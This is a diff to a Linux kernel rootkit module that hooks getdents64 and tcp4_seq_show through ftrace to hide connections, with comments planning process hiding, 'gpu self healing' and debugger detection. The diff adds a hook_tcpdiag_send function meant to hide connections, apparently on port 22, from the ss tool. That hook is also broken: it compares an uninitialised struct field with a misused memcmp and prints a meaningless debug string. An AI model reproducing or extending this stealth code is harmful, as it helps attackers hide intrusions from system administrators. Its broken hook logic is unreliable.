@@ -7,6 +7,8 @@
 #include <linux/namei.h>
 #include <linux/dirent.h>
 #include <net/sock.h>
+#include <linux/sock_diag.h>
+#include <linux/inet_diag.h>
 
 #include "ftrace_helper.h"
 
@@ -29,12 +31,12 @@ MODULE_VERSION("0.1");
 
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage int (*orig_tcpdiag_send)(int fd, int protocol,struct filter *f);
 
-//hide network connections/ports
+//hide network connections/ports(hide for ss now)
 //hide processes
 //gpu self healing
 //debugger detection
-//
 
 
 
@@ -134,6 +136,17 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
 			return 0;
 	
 	return orig_tcp4_seq_show(seq,v);
+}
+
+
+static asmlinkage int hook_tcpdiag_send(int fd, int protocol, struct filter *f){
+
+	struct inet_diag_req r;
+	if(memcmp(r.id.idiag_sport,htons(22),sizeof(r.id.idiag_sport))){
+			printk(KERN_DEBUG "SHABADBADOOBEE");
+			}
+
+	return 0;
 }
 
 
